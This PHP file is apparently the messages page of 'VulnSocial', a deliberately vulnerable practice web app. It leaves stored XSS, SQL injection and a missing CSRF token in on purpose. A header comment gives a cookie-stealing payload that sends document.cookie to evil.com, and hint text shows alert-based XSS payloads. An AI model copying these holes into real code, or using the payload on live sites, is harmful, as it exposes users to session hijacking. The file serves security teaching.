<?php
// ===================================================
// messages.php — Direct Messages
// VULNERABILITY: Stored XSS via message body
// Send: <script>document.location='http://evil.com?c='+document.cookie</script>
// ===================================================
require_once 'db.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

$user_id = $_SESSION['user_id'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to_user = intval($_POST['to_user']);
    $body    = $_POST['body']; // ❌ Stored XSS
    mysqli_query($conn, "INSERT INTO messages (from_user, to_user, body) VALUES ($user_id, $to_user, '$body')");
    header("Location: messages.php");
    exit();
}

// Fetch conversations
$msgs_q = "SELECT m.*, u1.username AS sender, u2.username AS receiver
            FROM messages m
            JOIN users u1 ON m.from_user = u1.id
            JOIN users u2 ON m.to_user   = u2.id
            WHERE m.from_user=$user_id OR m.to_user=$user_id
            ORDER BY m.sent_at DESC";
$msgs_r = mysqli_query($conn, $msgs_q);
$msgs   = [];
if ($msgs_r) {
    while ($row = mysqli_fetch_assoc($msgs_r)) $msgs[] = $row;
}

// All users for recipient dropdown
$all_users_r = mysqli_query($conn, "SELECT id, username FROM users WHERE id != $user_id");
$all_users   = [];
while ($u = mysqli_fetch_assoc($all_users_r)) $all_users[] = $u;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>VulnSocial — Messages</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
<nav class="navbar">
    <div class="nav-logo">🔓 VulnSocial</div>
    <div class="nav-links">
        <a href="feed.php">Home</a>
        <a href="profile.php?id=<?= $user_id ?>">My Profile</a>
        <a href="messages.php" class="active">Messages</a>
        <a href="settings.php">Settings</a>
        <a href="logout.php" class="btn-logout">Logout</a>
    </div>
</nav>

<div class="container">
    <div class="messages-wrapper">

        <div class="card">
            <h2>📨 Send a Message</h2>
            <!-- ❌ No CSRF token -->
            <form method="POST" action="messages.php">
                <div class="form-group">
                    <label>To</label>
                    <select name="to_user">
                        <?php foreach ($all_users as $u): ?>
                            <option value="<?= $u['id'] ?>"><?= htmlspecialchars($u['username']) ?></option>
                        <?php endforeach; ?>
                    </select>
                </div>
                <div class="form-group">
                    <label>Message</label>
                    <textarea name="body" rows="3" placeholder="Write your message...&#10;Try: &lt;script&gt;alert('XSS')&lt;/script&gt;"></textarea>
                </div>
                <button type="submit" class="btn btn-primary">Send</button>
            </form>
            <div class="vuln-hint" style="margin-top:12px">
                <strong>🔴 Stored XSS:</strong> Message body is saved raw.<br>
                Try: <code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code>
            </div>
        </div>

        <div class="card" style="margin-top:20px">
            <h2>📬 Inbox / Sent</h2>
            <?php if (empty($msgs)): ?>
                <p class="empty">No messages yet.</p>
            <?php else: ?>
                <?php foreach ($msgs as $m): ?>
                <div class="message-item <?= $m['from_user'] == $user_id ? 'sent' : 'received' ?>">
                    <div class="msg-meta">
                        <strong><?= $m['from_user'] == $user_id ? 'You → ' . htmlspecialchars($m['receiver']) : htmlspecialchars($m['sender']) . ' → You' ?></strong>
                        <span class="post-time"><?= $m['sent_at'] ?></span>
                    </div>
                    <!-- ❌ Stored XSS — body echoed raw -->
                    <div class="msg-body"><?= $m['body'] ?></div>
                </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>

    </div>
</div>
</body>
</html>
